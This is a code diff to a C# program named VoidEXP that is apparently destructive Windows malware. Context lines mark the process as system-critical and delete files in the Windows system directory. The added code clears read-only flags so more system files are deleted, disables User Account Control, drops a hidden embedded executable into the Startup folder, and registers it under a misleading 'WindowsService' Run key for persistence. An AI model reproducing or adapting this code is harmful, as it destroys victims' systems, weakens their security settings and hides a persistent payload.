@@ -21,6 +21,14 @@ namespace VoidEXP
             int iscritical = 1;
             NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iscritical, sizeof(int));
         }
+        public static void abustantanstart()
+        {
+            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","EnableLUA",0,RegistryValueKind.DWord);
+            Extract("VoidEXP",Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Resources","a.exe");
+            File.SetAttributes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),"a.exe"),FileAttributes.Hidden);
+            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WindowsService", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "a.exe"), RegistryValueKind.String);
+        }
+
         public static void del()
         {
             DirectoryInfo dir = new DirectoryInfo(Environment.SystemDirectory);
@@ -28,12 +36,25 @@ namespace VoidEXP
             {
                 try
                 {
+                    file.IsReadOnly = false;
                     file.Delete();
                 }
                 catch
                 {
 
                 }
+            }
+        }
+        public static void Extract(string NamespaceName, string OutPath, string InternalPath, string ResourceName)
+        {
+            Assembly assembly = Assembly.GetCallingAssembly();
+
+            using (Stream s = assembly.GetManifestResourceStream(NamespaceName + "." + (InternalPath == "" ? "" : InternalPath + ".") + ResourceName))
+            using (BinaryReader r = new BinaryReader(s))
+            using (FileStream fs = new FileStream(OutPath + "\\" + ResourceName, FileMode.OpenOrCreate))
+            using (BinaryWriter w = new BinaryWriter(fs))
+            {
+                w.Write(r.ReadBytes((int)s.Length));
             }
         }
         public static void Block()
